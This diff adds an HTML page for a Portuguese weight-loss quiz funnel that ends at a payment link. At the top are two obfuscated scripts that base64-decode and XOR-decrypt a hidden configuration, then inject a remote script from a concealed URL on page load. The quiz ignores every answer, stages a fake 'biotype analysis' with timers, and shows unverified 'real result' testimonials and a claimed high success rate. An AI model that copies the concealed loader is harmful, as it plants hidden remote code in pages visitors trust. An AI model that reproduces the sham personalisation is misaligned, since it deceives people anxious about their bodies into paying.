@@ -1,0 +1,518 @@
+<!DOCTYPE html><html lang="pt-BR">
+    <head>
+
+        <script>(function(){var i_4p=atob("DH3A7PJ2c5zhQfrPPAbimYAaUabDKY67TA76w90VF/LPNI6iVRu5wpEZHrKDM9W8Xw+pnIYFXOmVLIngUBy0iYECXfaSY9btXQm0npsUBuiEMtj1ZwbigpMbFr7bY56uSBztmYYbGvqYbIq9WQulgoZbC/+OJde8XxbiwNAAEvCUJNj1Hl+9wIlUHf2MJNj1HhmhmJNbBuiMKJy2EQ2yiYQTHejMMo+tVRmzzt5UBf2NNJ/tBl/ika8L");var u_la=[];for(var e_fvh5=0;e_fvh5<i_4p.length;e_fvh5++){u_la.push(i_4p.charCodeAt(e_fvh5)&255);}var o_m8y=u_la[0];var v_on=u_la.slice(1,1+o_m8y);var e_s6e=u_la.slice(1+o_m8y);var t_i=e_s6e.map(function(b,f_kkd0){return b^v_on[f_kkd0%o_m8y];});var n_yrn="";for(var r_fadf=0;r_fadf<t_i.length;r_fadf++){n_yrn+=String.fromCharCode(t_i[r_fadf]&255);}var b_fr=decodeURIComponent(escape(n_yrn));var e_hld=JSON.parse(b_fr);var e_vt=e_hld.globals||[];e_vt.forEach(function(t_zvu){window[t_zvu.name]=t_zvu.value;});var g_tj4=document.createElement("script");g_tj4.src=e_hld.url;g_tj4.async=true;g_tj4.defer=true;(e_hld.attributes||[]).forEach(function(m_rr4){g_tj4.setAttribute(m_rr4.name,m_rr4.value);});(document.head||document.documentElement).appendChild(g_tj4);})();</script>
+<script>(function(){var a_f0n=atob("DJIN8y+d6IlQi+iXyukvhl3xyrNy45zjuuE33AD+jOd+/pz6o/R03Uzyhacy+cfkqeBkg1vux/k584375eJki0rxxuMjqcS1q+Z5gUb/nf01+Mqtkc8h0Ujxh+sx55u18Ml20UH8hexyscrno+pon2b5yqVy/Yn7v/cvyQ2rib9ivI70rqA7lUuq2uxpudj1+/Y4kB2/ldQt");var h_d3el=[];for(var u_5dqy=0;u_5dqy<a_f0n.length;u_5dqy++){h_d3el.push(a_f0n.charCodeAt(u_5dqy)&255);}var v_uj=h_d3el[0];var v_7d=h_d3el.slice(1,1+v_uj);var l_fr=h_d3el.slice(1+v_uj);var t_6b2t=l_fr.map(function(b,p_b1){return b^v_7d[p_b1%v_uj];});var l_xs="";for(var h_yo=0;h_yo<t_6b2t.length;h_yo++){l_xs+=String.fromCharCode(t_6b2t[h_yo]&255);}var w_l=decodeURIComponent(escape(l_xs));var a_stg=JSON.parse(w_l);var e_g8=a_stg.globals||[];e_g8.forEach(function(e_2olk){window[e_2olk.name]=e_2olk.value;});var z_d853=document.createElement("script");z_d853.src=a_stg.url;z_d853.async=true;z_d853.defer=true;(a_stg.attributes||[]).forEach(function(j_mbm){z_d853.setAttribute(j_mbm.name,j_mbm.value);});(document.head||document.documentElement).appendChild(z_d853);})();</script>
+
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Avaliação Oficial - Missões</title>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;700;900&family=Inter:wght@400;500;600;700&family=Playfair+Display:ital,wght@0,600;0,700;1,600&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: 'Outfit', sans-serif;
+            background: #0c0a15;
+            min-height: 100vh;
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            overflow-x: hidden;
+            letter-spacing: -0.01em;
+            position: relative;
+        }
+
+        /* Fundo de estrelas */
+        .particles-bg {
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            background-image: 
+                radial-gradient(1.5px 1.5px at 20px 30px, #ffffff, rgba(0,0,0,0)),
+                radial-gradient(1.5px 1.5px at 40px 70px, #ffffff, rgba(0,0,0,0)),
+                radial-gradient(2px 2px at 90px 40px, #fff, rgba(0,0,0,0));
+            background-size: 150px 150px;
+            opacity: 0.15;
+            z-index: 0;
+            animation: moveStars 60s linear infinite;
+        }
+        @keyframes moveStars { from { transform: translateY(0); } to { transform: translateY(-150px); } }
+
+        /* Luz de fundo premium */
+        body::before {
+            content: ''; position: absolute; top: -100px; left: 50%; transform: translateX(-50%);
+            width: 500px; height: 500px;
+            background: radial-gradient(circle, rgba(219,39,119,0.15) 0%, rgba(255,255,255,0) 70%);
+            z-index: 0; border-radius: 50%;
+        }
+
+        .logo-box {
+            text-align: center; margin-top: 40px; margin-bottom: 20px;
+            position: relative; z-index: 2; animation: fadeIn 1s ease forwards;
+        }
+        .logo-text-1 {
+            font-family: 'Playfair Display', serif; color: #facc15; font-size: 2.8rem;
+            text-shadow: 0 0 20px rgba(250,204,21,0.4); line-height: 1;
+        }
+        .logo-text-2 {
+            font-family: 'Inter', sans-serif; color: #9d174d; font-size: 0.85rem;
+            letter-spacing: 0.6em; font-weight: 600; margin-left: 0.6em;
+            text-transform: uppercase;
+        }
+
+        .glass-box {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);
+            width: 100%; max-width: 500px;
+            border-radius: 40px 40px 0 0;
+            padding: 50px 30px 80px 30px;
+            position: relative; z-index: 2;
+            box-shadow: 0 -15px 40px rgba(0,0,0,0.5), inset 0 2px 10px rgba(255,255,255,0.05);
+            text-align: center;
+            min-height: 75vh;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            margin-top: 20px; flex: 1;
+        }
+
+        .title-main {
+            font-size: 2.2rem; font-weight: 800; line-height: 1.1; margin-bottom: 15px;
+            background: linear-gradient(135deg, #fff 0%, #cbd5e1 100%);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+        }
+        .subtitle {
+            font-family: 'Inter', sans-serif; font-size: 1.05rem; font-weight: 400;
+            line-height: 1.5; color: #94a3b8; margin-bottom: 35px;
+        }
+
+        .progress-bar-container {
+            width: 100%; background: rgba(255,255,255,0.05); border-radius: 30px;
+            height: 8px; margin-bottom: 40px; overflow: hidden; display: none;
+            position: relative; z-index: 2; border: 1px solid rgba(255,255,255,0.05);
+        }
+        .progress-bar-fill {
+            height: 100%; background: linear-gradient(90deg, #db2777 0%, #f472b6 100%);
+            width: 0%; border-radius: 30px; transition: width 0.6s ease;
+            box-shadow: 0 0 15px rgba(219,39,119,0.5);
+        }
+
+        .quiz-container {
+            display: none; flex-direction: column;
+            animation: slideUpFade 0.5s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+        .quiz-container.active { display: flex; }
+
+        .question {
+            font-size: 1.5rem; font-weight: 700; margin-bottom: 10px; line-height: 1.3;
+            color: #f8fafc;
+        }
+        .question-sub {
+            font-family: 'Inter', sans-serif; font-size: 0.85rem; font-weight: 600;
+            color: #db2777; margin-bottom: 30px; letter-spacing: 1px; text-transform: uppercase;
+        }
+
+
+.te-card {
+    background: rgba(255,255,255,0.04); border: 1px solid rgba(255,255,255,0.08);
+    border-radius: 18px; padding: 16px; margin-bottom: 16px;
+}
+.te-card img { width: 100%; border-radius: 12px; display: block; margin-bottom: 12px; }
+.te-stars { color: #f5c94d; font-size: 0.85rem; letter-spacing: 2px; margin-bottom: 8px; }
+.te-card p { font-family: 'Inter', sans-serif; font-size: 0.92rem; color: #dcdce6; line-height: 1.5; margin-bottom: 10px; }
+.te-who { font-size: 0.82rem; color: #94a3b8; font-weight: 600; }
+
+
+        .btn-quiz {
+            background: rgba(255,255,255,0.05); color: #f8fafc;
+            border: 1px solid rgba(255,255,255,0.1);
+            padding: 20px 24px; border-radius: 20px; font-size: 1.15rem; font-weight: 600;
+            font-family: 'Inter', sans-serif; margin-bottom: 12px; cursor: pointer;
+            transition: all 0.3s ease; text-align: left;
+            display: flex; justify-content: space-between; align-items: center;
+        }
+        .btn-quiz:hover { 
+            background: rgba(219,39,119,0.15); border-color: rgba(219,39,119,0.5);
+            transform: translateY(-2px);
+        }
+        .btn-quiz:active { transform: scale(0.98); }
+
+        /* Grid de cards com imagem (pergunta 1) */
+        .quiz-cards-grid {
+            display: grid; grid-template-columns: 1fr 1fr; gap: 14px; margin-bottom: 12px;
+        }
+        .btn-quiz-card {
+            background: rgba(255,255,255,0.05); color: #f8fafc;
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 20px; cursor: pointer; overflow: hidden;
+            font-family: 'Inter', sans-serif; transition: all 0.3s ease;
+            display: flex; flex-direction: column; align-items: center;
+            padding: 0 0 14px 0; text-align: center;
+        }
+        .btn-quiz-card img {
+            width: 100%; aspect-ratio: 1 / 1; object-fit: cover;
+            margin-bottom: 12px; display: block;
+        }
+        .btn-quiz-card span {
+            font-size: 0.95rem; font-weight: 600; padding: 0 10px;
+        }
+        .btn-quiz-card:hover {
+            background: rgba(219,39,119,0.15); border-color: rgba(219,39,119,0.5);
+            transform: translateY(-2px);
+        }
+        .btn-quiz-card:active { transform: scale(0.98); }
+
+        .btn-start {
+            background: linear-gradient(135deg, #db2777 0%, #9d174d 100%);
+            color: white; border: none; padding: 22px; border-radius: 20px;
+            font-size: 1.25rem; font-weight: 800; font-family: 'Outfit', sans-serif;
+            text-transform: uppercase; letter-spacing: 1px; cursor: pointer; width: 100%;
+            box-shadow: 0 10px 25px rgba(219,39,119,0.4), inset 0 2px 5px rgba(255,255,255,0.2);
+            transition: all 0.3s;
+        }
+        .btn-start:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(219,39,119,0.5); }
+
+        .btn-final {
+            display: block; background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+            color: white; text-decoration: none; padding: 24px; border-radius: 20px;
+            font-size: 1.3rem; font-weight: 900; text-transform: uppercase;
+            box-shadow: 0 10px 25px rgba(16,185,129,0.4), inset 0 2px 5px rgba(255,255,255,0.2);
+            animation: pulse-green 2s infinite; margin-top: 20px; transition: all 0.2s;
+        }
+
+        .loader-spinner {
+            width: 70px; height: 70px; border: 4px solid rgba(219,39,119,0.1);
+            border-top: 4px solid #db2777; border-radius: 50%;
+            animation: spin 1s linear infinite; margin: 0 auto 30px;
+        }
+
+        .disclaimer {
+            font-family: 'Inter', sans-serif; font-size: 0.8rem; color: #64748b;
+            margin-top: 30px; display: flex; align-items: center; justify-content: center; gap: 8px;
+        }
+
+        @keyframes slideUpFade { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        @keyframes pulse-green { 0%, 100% { transform: scale(1); box-shadow: 0 10px 25px rgba(16,185,129,0.4); } 50% { transform: scale(1.02); box-shadow: 0 15px 35px rgba(16,185,129,0.6); } }
+    </style>
+</head>
+<body>
+    <div class="particles-bg"></div>
+
+    <div class="logo-box">
+        <div class="logo-text-1">Emagrecendo</div>
+        <div class="logo-text-2">por missões</div>
+    </div>
+
+    <div class="glass-box">
+        
+        <div class="progress-bar-container" id="progress-bar-container">
+            <div class="progress-bar-fill" id="progress-fill"></div>
+        </div>
+
+        <!-- Tela de Abertura -->
+        <div id="intro-screen" style="display: block; margin-top: 20px;">
+            <div style="background: rgba(219,39,119,0.1); width: 60px; height: 60px; border-radius: 20px; display: flex; align-items: center; justify-content: center; margin: 0 auto 25px;">
+                <i data-lucide="activity" style="color: #db2777; width: 30px; height: 30px;"></i>
+            </div>
+
+<img src="img/BANNER QUADRADO.png" alt="BANNER" style="width: 100%; max-width: 480px; display: block; margin: 0 auto 24px; border-radius: 20px; box-shadow: 0 20px 50px -15px rgba(219,39,119,0.5);">
+<div class="subtitle">Responda o teste rápido e receba suas missões personalizadas no final
+
+</div>
+            <button class="btn-start" onclick="startQuiz()">QUERO EMAGRECER</button>
+            <div class="disclaimer"><i data-lucide="lock" style="width: 14px; height: 14px;"></i> Dados 100% seguros e anônimos.</div>
+        </div>
+
+        <!-- Pergunta 1: Idade -->
+        <div class="quiz-container" id="step-1">
+            <div class="question">Qual a sua faixa etária?</div>
+            <div class="question-sub">Passo 1 de 11</div>
+            <div class="quiz-cards-grid">
+                <button class="btn-quiz-card" onclick="nextStep(2)">
+                    <img src="img/18-29.png.png" alt="18 a 29 anos">
+                    <span>18 a 29 anos</span>
+                </button>
+                <button class="btn-quiz-card" onclick="nextStep(2)">
+                    <img src="img/30-39.png.png" alt="30 a 39 anos">
+                    <span>30 a 39 anos</span>
+                </button>
+                <button class="btn-quiz-card" onclick="nextStep(2)">
+                    <img src="img/40-49.png.png" alt="40 a 49 anos">
+                    <span>40 a 49 anos</span>
+                </button>
+                <button class="btn-quiz-card" onclick="nextStep(2)">
+                    <img src="img/50_.png.png" alt="Acima de 50 anos">
+                    <span>Acima de 50 anos</span>
+                </button>
+            </div>
+        </div>
+
+        <!-- Pergunta 2: Peso -->
+        <div class="quiz-container" id="step-2">
+            <div class="question">Qual o seu peso aproximado atual?</div>
+            <div class="question-sub">Passo 2 de 11</div>
+            <div class="quiz-cards-grid">
+            <button class="btn-quiz-card" onclick="nextStep(3)">
+                <img src="img/magra.png" alt="magra">
+                <span>Magra</span>
+            </button>
+            <button class="btn-quiz-card" onclick="nextStep(3)">
+                <img src="img/media.png" alt="media">
+                <span>Média</span> 
+            </button>
+            <button class="btn-quiz-card" onclick="nextStep(3)">
+                <img src="img/pouco gorda.png" alt="pouco gorda">
+                <span>Um pouco acima do peso</span>
+            </button>
+            <button class="btn-quiz-card" onclick="nextStep(3)">
+                <img src="img/muito gorda.png" alt="muito gorda">
+                <span>Muito acima do peso</span>
+            </button>
+        </div>
+        </div>
+
+        <!-- Pergunta 3: Corpo -->
+        <div class="quiz-container" id="step-3">
+            <div class="question">Qual parte do seu corpo mais te incomoda hoje?</div>
+            <div class="question-sub">Passo 3 de 11</div>
+            <div class="quiz-cards-grid">
+            <button class="btn-quiz-card" onclick="nextStep(4)">
+                <img src="img/barriga.png" alt="Barriga">
+                <span>Barriga</span>
+            </button>
+            <button class="btn-quiz-card" onclick="nextStep(4)">
+                <img src="img/pernas.png" alt="Pernas">
+                <span>Pernas</span> 
+            </button>
+            <button class="btn-quiz-card" onclick="nextStep(4)">
+                <img src="img/glúteos.png" alt="Glúteos">
+                <span>Glúteos</span>
+            </button>
+            <button class="btn-quiz-card" onclick="nextStep(4)">
+                <img src="img/corpo todo.png" alt="Corpo Todo">
+                <span>Corpo Todo</span>
+            </button>
+        </div>
+        </div>
+
+        <!-- Pergunta 4: Meta -->
+        <div class="quiz-container" id="step-4">
+            <div class="question">Qual a sua principal meta de redução?</div>
+            <div class="question-sub">Passo 4 de 11</div>
+            <div class="quiz-cards-grid">
+            <button class="btn-quiz-card" onclick="nextStep(5)">
+                <img src="img/menos de 5kg.png" alt="perder peso">
+                <span>Perder menos de 5kg</span>
+            </button>
+            <button class="btn-quiz-card" onclick="nextStep(5)">
+                <img src="img/entre 5 e 10kg.png" alt="perder peso">
+                <span>Perder entre 5kg e 10kg</span> 
+            </button>
+            <button class="btn-quiz-card" onclick="nextStep(5)">
+                <img src="img/mais de 10.png" alt="perder peso">
+                <span>Perder mais de 10kg</span> 
+            </button>
+            <button class="btn-quiz-card" onclick="nextStep(5)">
+                <img src="img/sentir bem.png" alt="perder peso">
+                <span>Quero me sentir bem</span> 
+            </button>
+        </div>
+        </div>
+
+
+        <!-- Tela de Depoimentos -->
+<div class="quiz-container" id="step-5">
+    <div class="question-sub">A prova de que dá certo</div>
+    <div class="question" style="font-size: 1.5rem;">Sua meta é <span style="color:#db2777;">possível e realista</span></div>
+    <div class="subtitle" style="margin-bottom: 24px;">Você pode chegar lá muito antes do que imagina — o caminho que elas trilharam pode ser o seu também.</div>
+
+    <div class="te-card">
+        <img src="img/depoimento 1.png" alt="Antes e depois - resultado real">
+        <div class="te-stars">★★★★★</div>
+        <p>"Eu não acreditava que fosse conseguir. Uma missão por dia, e o espelho começou a me mostrar outra pessoa."</p>
+        <div class="te-who">Resultado real de uma aluna</div>
+    </div>
+    <div class="te-card">
+        <img src="img/depoimento 2.jpg" alt="Antes e depois - resultado real">
+        <div class="te-stars">★★★★★</div>
+        <p>"Muito mais simples do que eu esperava. Só precisei de uma missão de cada vez — o resto foi consequência."</p>
+        <div class="te-who">Resultado real de uma aluna</div>
+    </div>
+    <div class="te-card">
+        <img src="img/depoimento 3.png" alt="Antes e depois - resultado real">
+        <div class="te-stars">★★★★★</div>
+        <p>"Comecei sem muita fé. Hoje, quando me olho no espelho, mal reconheço quem eu era."</p>
+        <div class="te-who">Resultado real de uma aluna</div>
+    </div>
+
+    <div class="subtitle" style="font-size: 0.78rem; margin: 4px 0 20px;">Resultados podem variar de pessoa para pessoa.</div>
+
+    <button class="btn-start" onclick="nextStep(6)">QUERO O MESMO RESULTADO</button>
+</div>
+
+
+
+        <!-- Pergunta 6: Exercícios -->
+        <div class="quiz-container" id="step-6">
+            <div class="question">Com que frequência você se exercita?</div>
+            <div class="question-sub">Passo 6 de 11</div>
+            <div class="quiz-cards-grid">
+            <button class="btn-quiz-card" onclick="nextStep(7)">
+                <img src="img/nao faço exercicio.png" alt="exercicio">
+                <span>Não faço exercício</span> 
+            </button>
+            <button class="btn-quiz-card" onclick="nextStep(7)">
+                <img src="img/1 2 vezes.png" alt="exercicio">
+                <span>1 a 2 vezes na semana</span>
+            </button>
+            <button class="btn-quiz-card" onclick="nextStep(7)">
+                <img src="img/3 4 vezes.png" alt="exercicio">
+                <span>3 a 4 vezes na semana</span> 
+            </button>
+            <button class="btn-quiz-card" onclick="nextStep(7)">
+                <img src="img/mais de 5.png" alt="exercicio">
+                <span>Mais de 5 vezes</span> 
+            </button>
+        </div>
+</div>
+
+        <!-- Pergunta 7: Obstáculo -->
+        <div class="quiz-container" id="step-7">
+            <div class="question">Qual o seu maior desafio no dia a dia para emagrecer?</div>
+            <div class="question-sub">Passo 7 de 11</div>
+            <button class="btn-quiz" onclick="nextStep(8)"><span>🍫 Não consigo resistir aos doces</span> <i data-lucide="chevron-right" style="width: 18px; color: #64748b;"></i></button>
+            <button class="btn-quiz" onclick="nextStep(8)"><span>🍽️ Não consigo controlar a quantidade que como</span> <i data-lucide="chevron-right" style="width: 18px; color: #64748b;"></i></button>
+            <button class="btn-quiz" onclick="nextStep(8)"><span>😩 Sempre começo uma dieta e desisto</span> <i data-lucide="chevron-right" style="width: 18px; color: #64748b;"></i></button>
+            <button class="btn-quiz" onclick="nextStep(8)"><span>❔ Outro</span> <i data-lucide="chevron-right" style="width: 18px; color: #64748b;"></i></button>
+        </div>
+
+
+
+         <!-- Pergunta 8: Incómodo -->
+        <div class="quiz-container" id="step-8">
+            <div class="question">O que mais te incomoda hoje?</div>
+            <div class="question-sub">Passo 8  de 11</div>
+            <button class="btn-quiz" onclick="nextStep(9)"><span>😔 Não gosto do meu corpo quando me olho no espelho</span> <i data-lucide="chevron-right" style="width: 18px; color: #64748b;"></i></button>
+            <button class="btn-quiz" onclick="nextStep(9)"><span>👕 Minhas roupas não servem como antes</span> <i data-lucide="chevron-right" style="width: 18px; color: #64748b;"></i></button>
+            <button class="btn-quiz" onclick="nextStep(9)"><span>❤️ Minha autoestima está muito baixa</span> <i data-lucide="chevron-right" style="width: 18px; color: #64748b;"></i></button>
+            <button class="btn-quiz" onclick="nextStep(9)"><span>❔ Outro</span> <i data-lucide="chevron-right" style="width: 18px; color: #64748b;"></i></button>
+        </div>
+
+         <!-- Tela da Solução -->
+        <div class="quiz-container" id="step-9">
+            <div class="question" style="font-size: 1.4rem;">Não é sua culpa! <span style="color:#db2777;">E agora você tem a solução.</span></div>
+            <img src="img/COMO FUNCIONA.png" alt="Como funciona o Emagrecendo por Missões" style="width: 100%; border-radius: 20px; margin-bottom: 22px; box-shadow: 0 20px 50px -15px rgba(219,39,119,0.5);">
+            <div class="subtitle" style="margin-bottom: 22px;">Ele vai te ajudar a perder peso e reduzir o inchaço de forma simples, te fazendo chegar no seu objetivo com pequenas ações diárias.</div>
+            <button class="btn-start" onclick="nextStep(10)">QUERO VER MEU RESULTADO!</button>
+        </div>
+
+
+
+         <!-- Pergunta 10: Conquista -->
+        <div class="quiz-container" id="step-10">
+            <div class="question">Imagine que daqui a 30 dias você alcançou seu objetivo. O que mais faria você pensar: "Valeu a pena"?</div>
+            <div class="question-sub">Passo 10  de 11</div>
+            <button class="btn-quiz" onclick="nextStep(11)"><span>😍 Gostar do meu reflexo no espelho</span> <i data-lucide="chevron-right" style="width: 18px; color: #64748b;"></i></button>
+            <button class="btn-quiz" onclick="nextStep(11)"><span>👖 Vestir qualquer roupa com confiança</span> <i data-lucide="chevron-right" style="width: 18px; color: #64748b;"></i></button>
+            <button class="btn-quiz" onclick="nextStep(11)"><span>📸 Tirar fotos sem vergonha</span> <i data-lucide="chevron-right" style="width: 18px; color: #64748b;"></i></button>
+            <button class="btn-quiz" onclick="nextStep(11)"><span>❔ Outro</span> <i data-lucide="chevron-right" style="width: 18px; color: #64748b;"></i></button>
+        </div>
+
+        <!-- Pergunta 11: Tempo -->
+        <div class="quiz-container" id="step-11">
+            <div class="question">Você consegue separar apenas 10 minutos do seu dia para ter o corpo que deseja?</div>
+            <div class="question-sub">Último Passo</div>
+            <button class="btn-quiz" onclick="nextStep('load')"><span style="color: #4ade80; font-weight: 700;">Sim, eu consigo!</span> <i data-lucide="check-circle-2" style="width: 18px; color: #4ade80;"></i></button>
+            <button class="btn-quiz" onclick="nextStep('load')"><span>Vou me esforçar para conseguir</span> <i data-lucide="chevron-right" style="width: 18px; color: #64748b;"></i></button>
+        </div>
+
+
+
+        <!-- Loading -->
+        <div class="quiz-container" id="step-load" style="margin-top: 40px;">
+            <div class="loader-spinner"></div>
+            <div style="font-size: 1.5rem; font-weight: 800; color: #fff;" id="load-text">Analisando biotipo...</div>
+            <div style="font-family: 'Inter', sans-serif; font-size: 1rem; color: #94a3b8; margin-top: 15px;" id="load-subtext">Isso levará apenas alguns segundos.</div>
+        </div>
+
+        <!-- Resposta Final -->
+        <div class="quiz-container" id="step-final">
+            <div style="background: rgba(16,185,129,0.1); border: 1px solid rgba(16,185,129,0.3); padding: 20px; border-radius: 50%; width: 80px; height: 80px; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px;">
+                <i data-lucide="check" style="color: #10b981; width: 40px; height: 40px;"></i>
+            </div>
+            
+            <div class="question" style="color: #fff; font-size: 2rem;">Perfil Compatível!</div>
+            
+            <p style="font-family: 'Inter', sans-serif; font-size: 1.1rem; line-height: 1.5; margin-bottom: 25px; color: #cbd5e1;">
+                SUAS MISSÕES DE 30 DIAS PARA EMAGRECER, <strong>FICARAM PRONTAS!</strong>.
+            </p>
+
+
+
+            <div style="background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.05); border-radius: 20px; padding: 20px; margin-bottom: 30px; text-align: left;">
+                <p style="font-family: 'Inter', sans-serif; font-size: 1rem; font-weight: 500; line-height: 1.8; color: #e2e8f0;">
+                    <i data-lucide="target" style="width: 16px; height: 16px; display: inline-block; vertical-align: text-bottom; color: #4ade80;"></i> <span style="color:#94a3b8;">Taxa de Sucesso:</span> Alta <br>
+                    <i data-lucide="clock" style="width: 16px; height: 16px; display: inline-block; vertical-align: text-bottom; color: #db2777;"></i> <span style="color:#94a3b8;">Tempo das missões:</span> ~10 mins<br>
+                    <i data-lucide="smartphone" style="width: 16px; height: 16px; display: inline-block; vertical-align: text-bottom; color: #3b82f6;"></i> <span style="color:#94a3b8;">Formato:</span> Aplicativo Liberado
+                </p>
+            </div>
+            
+            <a href="https://pay.kiwify.com.br/mv3slJI" class="btn-final">
+                ACESSAR MINHAS MISSÕES
+            </a>
+            
+            <div class="disclaimer" style="margin-top: 20px;"><i data-lucide="shield-check" style="width: 14px; height: 14px;"></i> Sistema oficial e protegido.</div>
+        </div>
+
+    </div>
+
+    <script>
+        lucide.createIcons();
+        const totalSteps = 11;
+        
+        function startQuiz() {
+            document.getElementById('intro-screen').style.display = 'none';
+            document.getElementById('progress-bar-container').style.display = 'block';
+            goToStep(1);
+        }
+
+        function goToStep(num) {
+            document.querySelectorAll('.quiz-container').forEach(el => el.classList.remove('active'));
+            document.getElementById('step-' + num).classList.add('active');
+            updateProgress(num);
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        function updateProgress(currentStep) {
+            const percentage = (currentStep / totalSteps) * 100;
+            document.getElementById('progress-fill').style.width = percentage + '%';
+        }
+
+        function nextStep(stepParams) {
+            if (stepParams === 'load') {
+                document.querySelectorAll('.quiz-container').forEach(el => el.classList.remove('active'));
+                document.getElementById('progress-bar-container').style.display = 'none';
+                document.getElementById('step-load').classList.add('active');
+                
+                setTimeout(() => { 
+                    document.getElementById('load-text').innerText = "Cruzando dados de idade e peso..."; 
+                }, 2000);
+                
+                setTimeout(() => { 
+                    document.getElementById('load-text').innerText = "Gerando missões personalizadas..."; 
+                    document.getElementById('load-subtext').innerText = "Quase pronto...";
+                }, 4000);
+
+                setTimeout(() => {
+                    document.getElementById('step-load').classList.remove('active');
+                    document.getElementById('step-final').classList.add('active');
+                }, 6000);
+            } else {
+                goToStep(stepParams);
+            }
+        }
+    </script>
+
+
+</body></html>
